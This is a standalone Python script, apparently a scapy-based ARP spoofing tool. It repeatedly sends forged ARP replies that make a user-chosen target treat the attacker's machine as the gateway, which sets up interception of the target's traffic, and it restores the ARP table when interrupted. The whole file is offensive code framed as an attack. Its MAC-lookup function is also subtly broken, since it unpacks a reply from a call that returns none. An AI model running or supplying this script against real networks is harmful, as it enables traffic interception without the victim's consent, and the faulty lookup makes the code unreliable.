from scapy.all import ARP, send
import time
import sys

def get_mac(ip):
    """Finds the MAC address of a given IP"""
    arp_request = ARP(pdst=ip)
    response, _ = send(arp_request, timeout=2, verbose=False)
    return response[0][1].hwsrc if response else None

def spoof(target_ip, fake_ip):
    """Spoofs the ARP cache of the target, making it think we are the fake IP"""
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=fake_ip)
    send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    """Restores the ARP table to prevent permanent disruption"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)

if __name__ == "__main__":
    target_ip = input("Enter target IP to attack: ")
    gateway_ip = input("Enter gateway IP (e.g., router IP): ")
    
    print(f"⚠️ Spoofing {target_ip}, making it think we are {gateway_ip}...")
    
    try:
        while True:
            spoof(target_ip, gateway_ip)
            time.sleep(2)  # Send packets every 2 seconds to maintain attack
    except KeyboardInterrupt:
        print("\nRestoring network, stopping attack...")
        restore(target_ip, gateway_ip)
        sys.exit(0)
